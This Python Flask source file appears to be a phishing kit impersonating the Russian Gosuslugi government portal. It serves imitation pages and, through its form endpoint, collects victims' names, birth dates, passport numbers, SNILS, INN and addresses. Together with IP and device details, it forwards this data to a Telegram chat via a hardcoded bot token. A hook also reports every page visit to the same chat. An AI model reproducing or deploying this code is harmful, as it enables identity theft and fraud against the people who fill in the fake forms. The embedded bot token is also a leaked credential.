import os
from datetime import datetime

import requests
from flask import Flask, render_template, send_from_directory, request, jsonify,session, redirect
from user_agents import parse
from db import db, User

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db'  # Укажите ваш URI для базы данных
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.environ.get('SECRET_KEY') or 'dev-secret-key'

db.init_app(app)

with app.app_context():
    db.create_all()  # Создает таблицы в базе данных
@app.route('/')
def index():
    return send_from_directory('templates', 'test.htm')

@app.route('/setup/')
def setup():
    return render_template('setup.html')

@app.route('/profile/personal/id-doc')
def id_doc():
    return send_from_directory('templates', 'pass_data.htm')


# Конфигурация Telegram бота
TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
TELEGRAM_CHAT_ID = "-1002557822121"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
CALLBACK_URL = "https://gepolis-gu-7624.twc1.net/callback"
TELEGRAM_AUTH_URL = f"https://oauth.telegram.org/auth?bot_id={TELEGRAM_TOKEN}&origin={CALLBACK_URL}&request_access=write"


def parse_user_agent(user_agent_str):
    """Анализируем User-Agent для получения детальной информации"""
    if not user_agent_str:
        return {}

    ua = parse(user_agent_str)
    return {
        'browser': f"{ua.browser.family} {ua.browser.version_string}",
        'os': f"{ua.os.family} {ua.os.version_string}",
        'device': f"{ua.device.family}",
        'is_mobile': ua.is_mobile,
        'is_tablet': ua.is_tablet,
        'is_pc': ua.is_pc,
        'is_bot': ua.is_bot
    }


def get_client_info(request):
    """Собираем полную информацию о клиенте"""
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip:
            ip = ip.split(',')[0].strip()

        user_agent = request.headers.get('User-Agent')
        ua_info = parse_user_agent(user_agent)

        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "network": {
                "ip": ip,
                "user_agent": user_agent,
                "accept_language": request.headers.get('Accept-Language'),
                "referrer": request.headers.get('Referer')
            },
            "device": {
                **ua_info,
                "screen_resolution": request.headers.get('X-Screen-Resolution'),
                "timezone": request.headers.get('X-Timezone'),
                "device_id": request.headers.get('X-Device-ID')
            }
        }
    except Exception as e:
        return {"error": str(e)}


def format_telegram_message(form_data, client_info):
    """Форматируем красивое сообщение для Telegram"""
    message = "🚀 <b>Новые данные с формы Госуслуг</b>\n\n"

    # Секция личных данных
    message += "👤 <b>Личные данные:</b>\n"
    message += f"  • Фамилия: {form_data.get('lastName', 'Не указано')}\n"
    message += f"  • Имя: {form_data.get('firstName', 'Не указано')}\n"
    message += f"  • Отчество: {form_data.get('middleName', 'Не указано')}\n"
    message += f"  • Дата рождения: {form_data.get('birthDate', 'Не указано')}\n"
    message += f"  • Место рождения: {form_data.get('birthPlace', 'Не указано')}\n\n"

    # Секция паспорта
    message += "📘 <b>Паспортные данные:</b>\n"
    message += f"  • Номер паспорта: {form_data.get('passportNumber', 'Не указано')}\n"
    message += f"  • Кем выдан: {form_data.get('passportIssued', 'Не указано')}\n"
    message += f"  • Код подразделения: {form_data.get('passportCode', 'Не указано')}\n"
    message += f"  • Дата выдачи: {form_data.get('passportDate', 'Не указано')}\n\n"

    # Секция адреса
    message += "🏠 <b>Адреса:</b>\n"
    message += f"  • Адрес регистрации: {form_data.get('registrationAddress', 'Не указано')}\n"
    message += f"  • Адрес проживания: {form_data.get('livingAddress', 'Не указано')}\n\n"

    # Секция документов
    message += "📄 <b>Документы:</b>\n"
    message += f"  • СНИЛС: {form_data.get('snilsNumber', 'Не указано')}\n"
    message += f"  • ИНН: {form_data.get('innNumber', 'Не указано')}\n\n"

    # Информация об устройстве
    message += "📱 <b>Информация об устройстве:</b>\n"
    message += f"  • Устройство: {client_info['device'].get('device', '')} "
    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
    message += f"  • Время: {client_info['timestamp']}\n"

    return message


def format_visit_message(client_info, page):
    """Форматируем сообщение о посещении страницы"""
    message = "👀 <b>Новый посетитель на сайте</b>\n\n"
    message += f"📄 <b>Страница:</b> {page}\n\n"

    message += "📱 <b>Информация об устройстве:</b>\n"
    message += f"  • Устройство: {client_info['device'].get('device', '')} "
    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
    message += f"  • Язык: {client_info['network'].get('accept_language', '')}\n"
    message += f"  • Реферер: {client_info['network'].get('referrer', 'Прямой заход')}\n"
    message += f"  • Время: {client_info['timestamp']}\n"

    return message


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


@app.before_request
def track_visits():
    """Отслеживаем посещения основных страниц"""
    if request.path in ['/', '/setup/', '/profile/personal/id-doc']:
        client_info = get_client_info(request)
        message = format_visit_message(client_info, request.path)
        send_to_telegram(message)


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


@app.route('/api/submit-form', methods=['POST'])
def submit_form():
    try:
        # Получаем данные формы
        form_data = request.json

        # Получаем информацию об устройстве
        client_info = get_client_info(request)

        # Формируем и отправляем сообщение
        message = format_telegram_message(form_data, client_info)
        if send_to_telegram(message):
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "Ошибка отправки"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route("/mobile")
def mobile():
    return render_template("pass_mobile.html")

@app.route("/mobile/details")
def mobile_details():
    return render_template("pass_mobile_detail.html")




@app.route('/callback')
def telegram_callback():
    auth_data = request.args

    if not verify_telegram_auth(auth_data):
        return "Invalid authentication", 403

    # Ищем или создаем пользователя
    user = User.query.filter_by(telegram_id=auth_data.get('id')).first()

    if not user:
        user = User(
            telegram_id=auth_data.get('id'),
            first_name=auth_data.get('first_name'),
            last_name=auth_data.get('last_name'),
            username=auth_data.get('username'),
            photo_url=auth_data.get('photo_url'),
            auth_date=datetime.fromtimestamp(int(auth_data.get('auth_date')))
        )
        db.session.add(user)
    else:
        # Обновляем данные при повторном входе
        pass
    print(auth_data)
    return auth_data



def verify_telegram_auth(auth_data):
    """Проверка подлинности данных от Telegram"""
    try:
        from hashlib import sha256
        import hmac
        import time

        hash_str = auth_data.get('hash')
        auth_date = int(auth_data.get('auth_date'))

        if time.time() - auth_date > 86400:
            return False

        check_data = auth_data.copy()
        del check_data['hash']

        data_check_arr = []
        for key in sorted(check_data.keys()):
            data_check_arr.append(f"{key}={check_data[key]}")
        data_check_string = "\n".join(data_check_arr)

        secret_key = sha256(TELEGRAM_TOKEN.encode()).digest()
        hmac_hash = hmac.new(secret_key, data_check_string.encode(), sha256).hexdigest()

        return hmac_hash == hash_str

    except Exception as e:
        print(f"Auth error: {e}")
        return False


@app.route('/auth')
def auth():
    return redirect(TELEGRAM_AUTH_URL)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)